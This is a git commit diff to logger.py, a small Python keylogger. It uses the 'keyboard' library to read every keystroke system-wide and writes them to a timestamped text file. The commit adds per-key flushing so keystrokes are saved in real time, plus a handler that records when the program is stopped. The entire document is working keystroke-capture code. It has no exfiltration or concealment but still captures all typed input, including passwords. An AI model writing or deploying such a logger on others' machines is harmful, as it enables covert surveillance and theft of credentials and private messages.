26f6d6b08381fc432a115f680f0d542c32737c1b
TJordahl90 <jordahl902002@gmail.com>
2025-02-05 13:43:40 -0600

    Flushed the std to write in real time, did try/catch for error handling, added a requirements.txt

--- logger.py
+++ logger.py
@@ -4,20 +4,24 @@ from datetime import datetime
 
 # Get the current date and time for filename
 now = datetime.now()
-now = now.strftime("%d-%m-%Y %H-%M-%S")
+now = now.strftime('%d-%m-%Y %H-%M-%S')
 
 # Create path
 path = now + '.txt'
 
 with open(path, 'w') as file:
-    while True:
-        key = keyboard.read_event(suppress=False)
-        if(str(key.name) in ['shift', 'right shift', 'ctrl']):
-            continue
-        elif(key.event_type == 'down'):
-            if(str(key.name) == 'enter'):
-                file.write('\n')
-            elif(str(key.name) == 'space'):
-                file.write(' ')
-            else:
-                file.write(key.name)
+    try:
+        while True:
+            key = keyboard.read_event(suppress=False)
+            if(str(key.name) in ['shift', 'right shift', 'ctrl']):
+                continue
+            elif(key.event_type == 'down'):
+                if(str(key.name) == 'enter'):
+                    file.write('\n')
+                elif(str(key.name) == 'space'):
+                    file.write(' ')
+                else:
+                    file.write(key.name)
+            file.flush()
+    except KeyboardInterrupt:
+        file.write(f'\nProgram killed at: {datetime.now().strftime('%d-%m-%Y %H:%M.%S')}')
